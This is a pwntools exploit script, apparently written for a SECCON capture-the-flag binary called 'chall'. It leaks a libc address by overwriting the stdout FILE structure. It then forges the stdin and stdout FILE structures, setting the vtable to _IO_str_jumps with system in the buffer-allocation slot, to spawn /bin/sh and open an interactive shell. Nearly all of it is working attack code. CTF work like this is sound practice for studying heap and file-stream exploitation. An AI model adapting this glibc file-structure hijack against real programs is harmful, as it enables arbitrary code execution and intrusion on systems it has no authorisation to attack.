#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
context.terminal = ['tmux', 'split-w', '-h']

elf  = ELF("./chall")
libc = ELF("./libc-2.27.so")
p    = process("./chall", env={"LD_PRELOAD": "./libc-2.27.so"})
#p    = remote("pwn-neko.chal.seccon.jp", 9003)
gdbscript = '''
gef
# before calling babyheap
# b *0x555555554b92
# before overwriting NULL byte
pie breakpoint *0xaf9
'''
p = gdb.debug(['./chall'], gdbscript=gdbscript)
REMOTE = False
# gdb.attach(p, gdbscript=gdbscript)

def create1(alloc_size, read_size, data):
        p.recv()
        p.sendline("1")
        p.recv()
        p.sendline(str(alloc_size))
        p.recv()
        p.sendline(str(read_size))
        p.recv()
        p.sendline(data)

def create2(alloc_size, read_size, data):
    p.sendline("1")
    p.sendline(str(alloc_size))
    p.sendline(str(read_size))
    p.sendline(data)

# Overwrite LSB of `_IO_read_end` in `stdout`
create1(0x200000, 0x5ed761, "A")

# Overwrite LSB of `_IO_write_base` in `stdout`
create2(0x200000, 0x5e6761 + 0x208010, "A")

# Have to recv for the remote, else it doesn't work???
if REMOTE:
    p.recv()

leak         = u64(p.recvline()[8:14].ljust(8, b'\x00'))
libc.address = leak - 0x3ed8b0
system       = libc.sym["system"]
bin_sh       = next(libc.search(b"/bin/sh"))
stdout       = libc.sym["_IO_2_1_stdout_"]
stdin        = libc.sym["_IO_2_1_stdin_"]
# stdfile_lock = libc.sym["_IO_stdfile_1_lock"]
stdfile_lock = libc.address +  0x3ed8d0
# wide_data    = libc.sym["_IO_wide_data_1"]
wide_data    = libc.address +  0x3eb8c0
# io_str_jumps = libc.sym["_IO_str_jumps"]
io_str_jumps = libc.address +  0x3e8360

log.info("LIBC leak: " + hex(leak))
log.info("LIBC base: " + hex(libc.address))
log.info("system@LIBC: " + hex(system))
log.info("/bin/sh: " + hex(bin_sh))
log.info("_IO_2_1_stdout_: " + hex(stdout))
log.info("_IO_2_1_stdin_: " + hex(stdin))

# Now that the stdout buffer has been cleared, we will actually receive the
# output from the program, so we use create1

# Overwrite the LSB of `_IO_buf_base` in `stdin`, third `fgets
create1(0x200000, 0x5e6761 + 0x208010 + 0x2002b8, "A")

# We can now overwrite 0x84 bytes of the `stdin` structure on the next `fgets`

# Overwriting the `stdin` file structure
fake  = p64(0xfbad208b) # _flags as they were before
fake += p64(stdin) # _IO_read_ptr (needs to be a valid pointer)
fake += p64(0) * 5 # _IO_read_end to _IO_write_end can all be 0
fake += p64(stdout) # _IO_buf_base, we are overwriting stdout
fake += p64(stdout + 0x2000) # _IO_buf_end, we can overwrite 0x2000 bytes
fake = fake.ljust(0x84, b"\x00") # 0x84 byte padding to get to the next `fgets`

# This is the fourth and final `fgets`
p.send(fake)

# We overwrote `_IO_buf_base` to `stdout`, and `_IO_buf_end` to `stdout+0x2000`
# so now we will be able to read 0x2000 bytes into the `stdout` structure when
# _IO_getline_info loops again

# Overwriting the `stdout` file structure
fake  = p64(0xfbad2886) # original _flags & ~_IO_USER_BUF
fake += p64(stdout) * 4 # _IO_read_ptr to _IO_write_base
fake += p64((bin_sh - 100) // 2) # _IO_write_ptr
fake += p64(0) * 2 # _IO_write_end and _IO_buf_base
fake += p64((bin_sh - 100) // 2) # _IO_buf_end
fake += p64(0) * 4 # _IO_save_base to _markers
fake += p64(stdin) # _chain
fake += p32(1) # _fileno
fake += p32(0) # _flags2
fake += p64(0xffffffffffffffff) # _old_offset
fake += p16(0) # _cur_column
fake += p8(0) # _vtable_offset
fake += b'\n' # _shortbuf
fake += p32(0) # padding between shortbuf and _lock
fake += p64(stdfile_lock) # _lock
fake += p64(0xffffffffffffffff) # _offset
fake += p64(0) # _codecvt
fake += p64(wide_data) # _wide_data
fake += p64(0) # _freeres_list
fake += p64(0) #_freeres_buf
fake += p64(0) #__pad5
fake += p32(0xffffffff) # _mode
fake += b'\0'*20 # _unused2
fake += p64(io_str_jumps) # vtable
fake += p64(system) # _s._allocate_buffer
fake += p64(stdout) # _s._free_buffer

p.sendline(fake)

p.interactive()
